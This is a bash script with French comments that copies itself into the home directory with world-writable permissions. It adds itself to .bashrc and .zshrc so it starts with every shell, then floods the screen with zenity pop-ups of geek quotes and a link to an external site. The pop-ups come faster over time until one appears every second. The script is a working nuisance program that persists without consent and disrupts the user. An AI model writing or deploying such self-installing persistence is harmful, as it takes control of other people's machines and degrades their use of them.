#!/bin/bash

# Nom du script pour se copier
SCRIPT_NAME="popup_script.sh"

# Chemin complet où le script sera copié
DEST_PATH="$HOME/$SCRIPT_NAME"

# Copier le script dans le répertoire home si ce n'est pas déjà fait
if [ ! -f $DEST_PATH ]; then
    cp "$0" $DEST_PATH
    chmod 777 $DEST_PATH
fi

# Ajouter la commande pour exécuter le script au lancement de la session
AUTO_START_CMD="$DEST_PATH &"

# Fonction pour ajouter l'autostart au fichier shell de l'utilisateur
function add_to_startup {
    SHELL_CONFIG_FILE="$1"
    if [ -f "$SHELL_CONFIG_FILE" ]; then
        # Vérifie si la commande n'est pas déjà présente
        if ! grep -q "$AUTO_START_CMD" "$SHELL_CONFIG_FILE"; then
            echo "$AUTO_START_CMD" >> "$SHELL_CONFIG_FILE"
        fi
    fi
}

# Ajoute le script à .bashrc et .zshrc si disponibles
add_to_startup "$HOME/.bashrc"
add_to_startup "$HOME/.zshrc"

# Liste des messages
MESSAGES=(
    "There is no spoon. - Neo"
    "It's dangerous to go alone! Take this. - Old Man"
    # ... (autres messages) ...
    "pop-ups are annoying, go to https://codekarma42.github.io/web/"
)

function show_random_message {
    RANDOM_INDEX=$(($RANDOM % ${#MESSAGES[@]}))
    MESSAGE=${MESSAGES[$RANDOM_INDEX]}
    zenity --warning --title="Geek Wisdom" --text="$MESSAGE" &
}

START_TIME=$(date +%s)

while true; do
    CURRENT_TIME=$(date +%s)
    ELAPSED_TIME=$((CURRENT_TIME - START_TIME))

    if [ $ELAPSED_TIME -lt 3600 ]; then
        DELAY=$(shuf -i 1-600 -n 1)
    elif [ $ELAPSED_TIME -lt 7200 ]; then
        DELAY=$(shuf -i 1-60 -n 1)
    elif [ $ELAPSED_TIME -lt 10800 ]; then
        DELAY=$(shuf -i 1-10 -n 1)
    else
        DELAY=1
    fi

    sleep $DELAY
    show_random_message
done
